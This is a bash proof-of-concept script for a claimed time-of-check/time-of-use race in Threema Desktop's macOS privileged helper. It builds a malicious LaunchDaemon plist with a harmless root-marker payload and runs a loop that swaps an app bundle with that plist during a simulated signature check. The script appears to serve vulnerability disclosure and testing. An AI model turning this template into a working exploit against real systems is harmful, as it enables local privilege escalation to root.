#!/bin/bash
#
# Simplified TOCTOU POC - Demonstrates the race condition
# Usage: ./poc-race-simple.sh
#

set -e

echo "[*] Threema Desktop macOS Helper TOCTOU Race Condition POC"
echo "[*] ========================================================"
echo ""

# Setup
TEST_DIR="/tmp/threema-toctou-poc-$$"
mkdir -p "$TEST_DIR"
cd "$TEST_DIR"

echo "[+] Setup: Creating test environment in $TEST_DIR"

# Check if Threema.app exists
if [ ! -d "/Applications/Threema.app" ]; then
    echo "[!] ERROR: /Applications/Threema.app not found"
    echo "[!] Please install Threema Desktop first"
    rm -rf "$TEST_DIR"
    exit 1
fi

# Copy valid Threema.app
echo "[+] Step 1: Copying valid Threema.app (will pass signature check)"
cp -R /Applications/Threema.app payload.app

# Create malicious plist
echo "[+] Step 2: Creating malicious LaunchDaemon plist"
cat > malicious.plist << 'PLIST_EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.attacker.threema-poc</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>echo "PWNED AS ROOT" > /tmp/threema-poc-root-owned.txt</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
PLIST_EOF

# Get file sizes for verification
PAYLOAD_SIZE=$(du -sh payload.app | cut -f1)
PLIST_SIZE=$(stat -f%z malicious.plist)
echo "[+] Payload size: $PAYLOAD_SIZE"
echo "[+] Plist size: $PLIST_SIZE bytes"

# Create destination (required for helper to read existing permissions)
echo "[+] Step 3: Creating destination placeholder"
touch destination-placeholder.plist

# Spawn race loop
echo "[+] Step 4: Spawning race condition loop..."
echo "[*] RACE LOOP RUNNING: Attempting to swap payload.app with malicious.plist"

(
    RACE_COUNT=0
    while [ $RACE_COUNT -lt 100 ]; do
        # Swap: valid app ↔ malicious plist
        mv payload.app payload.app.bak 2>/dev/null || true
        mv malicious.plist payload.app 2>/dev/null || true

        # Keep in "malicious" state for 20ms (race window opportunity)
        sleep 0.02

        # Swap back
        mv payload.app malicious.plist 2>/dev/null || true
        mv payload.app.bak payload.app 2>/dev/null || true

        RACE_COUNT=$((RACE_COUNT + 1))

        # Progress indicator
        if [ $((RACE_COUNT % 10)) -eq 0 ]; then
            echo -n "."
        fi
    done
    echo ""
) &
RACE_PID=$!

# Simulate the helper's validation operation
echo "[+] Step 5: Simulating SecStaticCodeCheckValidityWithErrors() blocking operation"
echo "[*] VALIDATION: Validating signature of payload.app..."

# This sleep represents the blocking signature validation (100-300ms)
# During this time, the race loop is actively swapping the file
sleep 0.3

echo "[*] VALIDATION: Signature check completed (assumed valid)"

# Now try to copy - simulates replace_directory_atomic()
echo "[+] Step 6: Attempting to copy validated payload..."

# Check what we're about to copy
if file payload.app | grep -q directory; then
    echo "[*] RESULT: payload.app is a DIRECTORY (app bundle) - Race FAILED, signature check held"
    RACE_RESULT="FAILED"
elif file payload.app | grep -q ASCII; then
    echo "[*] RESULT: payload.app is a PLIST FILE - Race SUCCEEDED! ✓"
    echo "[*]         Helper would now write plist as root:wheel to LaunchDaemons"
    RACE_RESULT="SUCCESS"

    # Show what the plist contains (what would execute as root)
    echo ""
    echo "[!] MALICIOUS PLIST CONTENT (would execute as root):"
    cat payload.app | head -20
    echo "[!] ..."
else
    echo "[*] RESULT: Unknown file type"
    RACE_RESULT="UNKNOWN"
fi

# Cleanup race loop
kill $RACE_PID 2>/dev/null || true
wait $RACE_PID 2>/dev/null || true

# Report
echo ""
echo "[*] ========================================================"
echo "[*] RACE CONDITION TEST RESULTS"
echo "[*] ========================================================"
echo "[+] Race Result: $RACE_RESULT"
echo "[+] Test Directory: $TEST_DIR"
echo "[*]"

if [ "$RACE_RESULT" = "SUCCESS" ]; then
    echo "[!]   TOCTOU VULNERABILITY CONFIRMED"
    echo "[!] The race condition can swap files during validation."
    echo "[!] In a real attack, helper would write malicious plist as root."
    echo "[!]"
    echo "[!] Impact: Local Privilege Escalation → root"
else
    echo "[*] Race condition did not trigger in this run."
    echo "[*] Try running again - timing is dependent on system load."
fi

echo "[*]"
echo "[+] Cleanup: Run 'rm -rf $TEST_DIR' to clean up"
echo ""

# Keep test directory for inspection
# rm -rf "$TEST_DIR"
